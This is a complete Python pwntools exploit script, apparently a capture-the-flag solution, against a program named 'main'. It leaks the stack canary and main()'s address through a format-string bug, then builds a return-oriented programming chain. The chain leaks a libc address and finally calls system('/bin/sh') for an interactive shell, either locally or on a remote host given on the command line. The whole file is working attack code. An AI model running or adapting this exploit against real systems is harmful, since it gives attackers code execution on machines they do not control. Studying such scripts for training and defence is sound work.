#!/usr/bin/env python3

from pwn import context, ELF, log, p64, remote, ROP, sys, u64

context.binary = elf = ELF('main')
glibc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)


def get_process():
    global glibc

    if len(sys.argv) == 1:
        return context.binary.process()

    glibc = ELF('libc6_2.27-3ubuntu1.5_amd64.so', checksec=False)
    host, port = sys.argv[1], 443
    return remote(host, port, ssl=True, sni=host)


def get_canary_main_addr(p):
    p.sendlineafter(b'Please fill in your name:\n', b'%11$lx.%27$lx')
    p.recvuntil(b'Thank you ')
    canary, main_addr = map(lambda x: int(x, 16), p.recvline().split(b'.'))

    log.info(f'Leaked canary: {hex(canary)}')
    log.info(f'Leaked main() address: {hex(main_addr)}')

    return canary, main_addr


def main():
    p = get_process()
    canary, main_addr = get_canary_main_addr(p)

    elf.address = main_addr - elf.sym.main
    log.info(f'ELF base address: {hex(elf.address)}')
    rop = ROP(elf)

    offset = 56
    junk = b'A' * offset

    leaked_function = 'setvbuf'

    payload  = junk
    payload += p64(canary)
    payload += p64(0)
    payload += p64(rop.find_gadget(['pop rdi', 'ret'])[0])
    payload += p64(elf.got[leaked_function])
    payload += p64(elf.plt.puts)
    payload += p64(elf.sym.main)

    p.sendlineafter(b'So let\'s get into business, give me a secret to exploit me :).\n', payload)
    p.recvline()
    leaked_function_addr = u64(p.recvline().strip().ljust(8, b'\0'))

    log.info(f'Leaked {leaked_function}() address: {hex(leaked_function_addr)}')

    glibc.address = leaked_function_addr - glibc.sym[leaked_function]
    log.info(f'Glibc base address: {hex(glibc.address)}')

    p.sendline()

    payload  = junk
    payload += p64(canary)
    payload += p64(0)
    payload += p64(rop.find_gadget(['ret'])[0])
    payload += p64(rop.find_gadget(['pop rdi', 'ret'])[0])
    payload += p64(next(glibc.search(b'/bin/sh')))
    payload += p64(glibc.sym.system)

    p.sendlineafter(b'So let\'s get into business, give me a secret to exploit me :).\n', payload)
    p.recvline()

    p.interactive()


if __name__ == '__main__':
    main()
